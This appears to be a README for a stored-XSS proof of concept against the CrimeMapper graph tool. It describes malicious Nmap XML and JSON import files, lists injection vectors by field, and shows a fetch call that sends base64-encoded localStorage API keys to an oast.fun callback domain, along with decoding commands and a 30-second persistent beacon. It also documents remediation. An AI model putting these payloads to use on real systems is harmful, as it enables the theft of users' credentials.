# CrimeMapper XSS Proof of Concept

**Target Interactsh Domain:** `dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun`

---

## Quick Demo

### Using the Nmap XML Import (Easiest)

1. Open the **vulnerable** CrimeMapper (`/CrimeMapper/crimemapper.html`)
2. Set some API keys in Settings (Shodan, IPInfo, etc.) - these will be exfiltrated
3. Click **Import Nmap XML** button
4. Select `malicious_nmap_scan.xml`
5. Hover over any imported node to trigger the XSS
6. Watch Interactsh for incoming DNS callbacks with base64-encoded API keys

### Using JSON Import

1. Open the vulnerable CrimeMapper
2. Click **Import Graph**
3. Select any of the JSON files in this folder
4. The XSS triggers on import/hover

---

## PoC Files

| File | Vector | Trigger |
|------|--------|---------|
| `malicious_nmap_scan.xml` | Nmap XML import | Hover over nodes |
| `01_contact_email_xss.json` | Contact email field | Hover tooltip |
| `02_ip_notes_xss.json` | IP notes field | Hover tooltip |
| `03_organization_xss.json` | Organization name | Hover tooltip |
| `04_domain_chunked_exfil.json` | Domain field | Hover (chunked exfil) |
| `05_context_menu_breakout.json` | Contact email | Right-click context menu |
| `06_favicon_hash_xss.json` | Favicon hash field | Hover tooltip |
| `12_persistent_xss_localstorage.json` | Persistent interval | Auto-runs every 30s |

---

## Nmap XML Payloads

The `malicious_nmap_scan.xml` contains XSS in these fields:

```
Host 1: Hostname PTR record     → <img onerror=...>
Host 2: Service product field   → <svg onload=...>
Host 3: OS match name           → Multi-key exfil
Host 4: Service extrainfo       → <details ontoggle=...>
Host 5: Script output           → <script> tag
Host 6: Hostname                → Chunked exfil (large localStorage)
Host 7: Service product         → Persistent beacon (30s interval)
Host 8: SSL cert script output  → SSL field injection
```

---

## Decoding Captured Data

```bash
# Single callback subdomain
echo "c2hvZGFuQXBpS2V5PTEyMzQ1Njc4OQ==" | base64 -d
# Output: shodanApiKey=123456789

# Reassemble chunked exfil
cat chunks.txt | tr -d '\n' | base64 -d | jq .
```

---

## Comparison: Vulnerable vs Fixed

### Vulnerable Version
```
/CrimeMapper/crimemapper.html
```
- No CSP header
- No input encoding
- Inline onclick handlers
- Direct innerHTML usage

### Fixed Version
```
/CrimeMapper_FIXED/crimemapper.html
```
- CSP blocks unauthorized domains
- All inputs HTML-encoded
- Event delegation pattern
- textContent instead of innerHTML
- Import warning dialog

---

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTACKER                                     │
│  1. Creates malicious Nmap XML with XSS payloads                │
│  2. Sends to victim (email, shared drive, etc.)                 │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      VICTIM                                      │
│  1. Opens CrimeMapper                                           │
│  2. Has API keys stored in localStorage                         │
│  3. Imports "scan results" from attacker                        │
│  4. Hovers over node → XSS executes                             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                   EXFILTRATION                                   │
│  fetch('https://'+btoa(localStorage)+'.attacker.oast.fun')      │
│                              │                                   │
│                              ▼                                   │
│  DNS query: c2hvZGFuQXBpS2V5PTEyMzQ1.attacker.oast.fun         │
│                              │                                   │
│                              ▼                                   │
│  Attacker decodes: shodanApiKey=12345...                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## Remediation

See `/CrimeMapper_FIXED/SECURITY_FIXES.md` for complete documentation of:

1. Content Security Policy implementation
2. HTML entity encoding
3. Event delegation pattern
4. Prototype pollution prevention
5. Safe DOM manipulation

---

## Disclaimer

These files are for **authorized security testing and educational purposes only**.

Unauthorized use of these techniques against systems you do not own or have permission to test is illegal.
